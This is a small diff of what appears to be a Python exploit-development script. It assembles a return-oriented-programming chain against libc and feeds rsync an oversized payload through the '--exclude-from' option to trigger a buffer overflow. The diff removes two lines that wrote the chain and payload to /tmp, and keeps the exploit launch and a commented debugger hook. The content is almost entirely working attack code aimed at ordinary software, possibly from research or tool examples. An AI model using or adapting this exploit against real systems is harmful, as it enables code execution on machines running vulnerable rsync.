@@ -25,9 +25,6 @@ rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.Arch
 
 payload = ("A" * 5696) + "J"*8 + rop
 
-with open("/tmp/rop", "w") as f: f.write(rop)
-with open("/tmp/payload", "w") as f: f.write(payload)
-
 print "Starting rsync with the exploit payload"
 p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\n")
